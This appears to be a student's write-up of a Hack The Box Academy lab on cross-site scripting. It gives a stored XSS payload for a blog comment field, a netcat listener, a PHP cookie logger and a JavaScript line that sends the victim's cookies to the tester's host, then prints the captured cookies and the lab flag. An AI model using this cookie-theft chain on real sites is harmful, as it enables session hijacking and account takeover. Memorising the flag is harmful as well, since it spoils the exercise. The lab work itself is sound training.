# Skills Assessment

We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:

![](https://academy.hackthebox.com/storage/modules/103/xss\_skills\_assessment\_website.jpg)

Apply the skills you learned in this module to achieve the following:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag

**Questions**

What is the value of the 'flag' cookie?

```bash
#http://10.129.238.42/assessment/
# found comment section, try to find xs there
"><script src="http://10.10.15.15"></script>
nc -nvlp 80

#now we create index.php & script.js
nano index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['10.129.238.42']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

nano script.js
new Image().src='http://10.10.15.15/index.php?c='+document.cookie

sudo php -S 10.10.15.15

#now call it
"><script src="http://10.10.15.15/script.js"></script>
GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1709471167;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
HTB{cr055_5173_5cr1p71n6_n1nj4}
```
